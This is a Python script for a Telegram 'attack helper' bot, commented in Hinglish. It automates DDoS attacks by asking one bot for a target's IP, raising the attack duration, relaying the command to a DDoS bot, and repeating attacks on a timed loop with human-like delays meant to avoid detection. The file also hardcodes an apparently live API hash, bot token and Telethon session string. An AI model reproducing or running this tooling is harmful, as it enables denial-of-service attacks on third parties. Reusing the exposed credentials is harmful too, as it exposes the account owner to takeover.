import asyncio
import re
import random
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 35284354
API_HASH = "1369f6f5653d5589b735def06a23703c"
BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT

STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# --------- STATE ---------

chat_targets: dict[int, str] = {}        # current target per TG chat
chat_counts: dict[int, int] = {}
saved_targets: dict[int, list[str]] = {} # multiple saved links/ids per TG chat

ip_waiters: dict[int, asyncio.Future] = {}
bot_b_status = "UNKNOWN"

auto_tasks: dict[int, asyncio.Task] = {}
BASE_DELAY = 70   # har attack ke baad fixed 70s wait


# ---------- HELPERS (human-like) ----------

async def human_sleep(min_s: float, max_s: float):
    await asyncio.sleep(random.uniform(min_s, max_s))

async def human_type_and_send(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str):
    t = min(5, max(0.7, len(text) * 0.03 + random.uniform(-0.3, 0.5)))
    await context.bot.send_chat_action(chat_id, "typing")
    await asyncio.sleep(t)
    await context.bot.send_message(chat_id, text)


# ---------- LISTENERS ----------

@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    text = event.text or ""
    print("📩 IP BOT REPLY:", repr(text))

    m_line = re.search(r"CMD:(.+)", text, flags=re.IGNORECASE)
    if not m_line:
        return

    line = m_line.group(1).strip()

    m_cmd = re.search(r"`([^`]+)`", line)
    if m_cmd:
        raw_cmd = m_cmd.group(1).strip()
    else:
        raw_cmd = line.lstrip("* ").strip()

    # last 2 chars ko 50 kar do (30 -> 50)
    if len(raw_cmd) >= 2:
        final_cmd = raw_cmd[:-2] + "50"
    else:
        final_cmd = raw_cmd

    print("✅ FINAL CMD:", final_cmd)

    await human_sleep(0.4, 1.2)

    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(final_cmd)
        ip_waiters.pop(chat_id, None)


@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    global bot_b_status
    text = event.text or ""
    low = text.lower()
    print("DDOS BOT MSG:", repr(text))

    if "ready" in low and ("no attack running" in low or "you can start a new attack" in low):
        bot_b_status = "READY"
    elif (
        "attack started" in low
        or "starting attack" in low
        or "attack running" in low
        or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
        or "sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ" in text
        or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
    ):
        bot_b_status = "RUNNING"
    elif "cooldown" in low or "⏳" in text:
        bot_b_status = "COOLDOWN"


# ---------- SINGLE ROUND ----------

async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    target = chat_targets.get(chat_id)
    if not target:
        await human_type_and_send(
            context,
            chat_id,
            "❌ Pehle target set karo. /addchat se add karo, /listchats se dekho, /usetarget se select karo."
        )
        return

    await human_type_and_send(
        context,
        chat_id,
        f"➡️ Thoda ruk, `{target}` ka IP nikal raha hu…"
    )

    loop = asyncio.get_running_loop()
    fut = loop.create_future()
    ip_waiters[chat_id] = fut

    await human_sleep(0.8, 2.0)
    await tele.send_message(BOT_A, f".getip all {target}")

    try:
        final_cmd = await asyncio.wait_for(fut, timeout=60)
    except asyncio.TimeoutError:
        await human_type_and_send(
            context,
            chat_id,
            "⏱️ IP BOT reply nahi diya, ye attack skip kar raha hu."
        )
        ip_waiters.pop(chat_id, None)
        return

    await human_type_and_send(
        context,
        chat_id,
        f"📥 IP BOT ne ye CMD diya:`{final_cmd}`"
    )

    await human_sleep(1.0, 3.0)
    await tele.send_message(BOT_B, final_cmd)

    await human_type_and_send(
        context,
        chat_id,
        f"🚀 DDOS BOT ko bhej diya:`{final_cmd}`"
    )


# ---------- AUTO LOOP WORKER (fixed delay) ----------

async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    count = chat_counts.get(chat_id, 1)

    await human_type_and_send(
        context,
        chat_id,
        f"🔁 Auto loop start kar raha hu.Attacks: {count}Fixed delay: {BASE_DELAY}s har attack ke baad."
    )

    try:
        for i in range(count):
            await human_type_and_send(
                context,
                chat_id,
                f"▶️ Attack {i + 1}/{count} shuru karte hain…"
            )

            await single_round(chat_id, context)

            if i == count - 1:
                break  # last attack, ab delay nahi

            await human_type_and_send(
                context,
                chat_id,
                f"⏳ Next attack se pehle {BASE_DELAY}s wait karunga…"
            )
            await asyncio.sleep(BASE_DELAY)  # yahi fixed gap hai

    except asyncio.CancelledError:
        await human_type_and_send(
            context,
            chat_id,
            "🛑 Auto loop force stop ho gaya (stop command se)."
        )
        raise
    finally:
        auto_tasks.pop(chat_id, None)
        await human_type_and_send(context, chat_id, "✅ Auto loop khatam ho gaya.")


# ---------- COMMAND HANDLERS ----------

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
👋 Hey, main attack helper bot hu.

Commands:
/addchat <link_or_chatid>        - Target list me add karo
/listchats                       - Saved chats/IDs number ke sath dekho
/usetarget <number>              - List me se current target select karo
/setcount <number_of_attacks>    - Kitne attacks chahiye
/startloop                       - Ek single attack
/autoloop                        - Fixed delay ke sath auto attacks
/stoploop                        - Auto loop turant band karo
"""
    await human_type_and_send(context, update.effective_chat.id, text.strip())


async def addchat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not context.args:
        await update.message.reply_text("Usage: /addchat <group_link_or_chatid>")
        return

    target = " ".join(context.args).strip()
    saved_targets.setdefault(chat_id, [])

    if target in saved_targets[chat_id]:
        await update.message.reply_text("ℹ️ Ye chat/id pehle se list me hai.")
        return

    saved_targets[chat_id].append(target)
    await update.message.reply_text(f"✅ Added: `{target}`", parse_mode="Markdown")


async def listchats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    lst = saved_targets.get(chat_id, [])

    if not lst:
        await update.message.reply_text("📭 Abhi koi saved chat/id nahi hai. /addchat use karo.")
        return

    lines = []
    for i, t in enumerate(lst, start=1):
        lines.append(f"{i}. `{t}`")
    text = "📚 Saved chats/IDs:" + "".join(lines)
    await update.message.reply_text(text, parse_mode="Markdown")


async def usetarget(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    lst = saved_targets.get(chat_id, [])

    if not lst:
        await update.message.reply_text("❌ List khaali hai. Pehle /addchat se add karo.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /usetarget <number_from_/listchats>")
        return

    idx = int(context.args[0])
    if idx < 1 or idx > len(lst):
        await update.message.reply_text("❌ Galat index. /listchats se sahi number dekho.")
        return

    target = lst[idx - 1]
    chat_targets[chat_id] = target
    await update.message.reply_text(f"🎯 Current target set: `{target}`", parse_mode="Markdown")


async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setcount <number_of_attacks>")
        return
    n = max(1, int(context.args[0]))
    chat_counts[update.effective_chat.id] = n
    await human_type_and_send(context, update.effective_chat.id, f"✅ Attack count {n} set kar diya.")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await single_round(update.effective_chat.id, context)


async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if chat_id in auto_tasks:
        await update.message.reply_text("⚠️ Auto loop already chal raha hai.")
        return

    task = asyncio.create_task(autoloop_worker(chat_id, context))
    auto_tasks[chat_id] = task
    await update.message.reply_text("🔁 Auto loop task start kar diya.")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    task = auto_tasks.get(chat_id)

    if task:
        task.cancel()
        await update.message.reply_text(
            "🛑 Stop signal bhej diya, thodi der me loop band ho jayega."
        )
    else:
        await update.message.reply_text("ℹ️ Is chat me koi auto loop nahi chal raha.")


# ---------- MAIN ----------

async def main():
    await tele.start()
    print("🧵 Telethon connected")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("addchat", addchat))
    app.add_handler(CommandHandler("listchats", listchats))
    app.add_handler(CommandHandler("usetarget", usetarget))
    app.add_handler(CommandHandler("setcount", setcount))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("autoloop", autoloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await tele.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())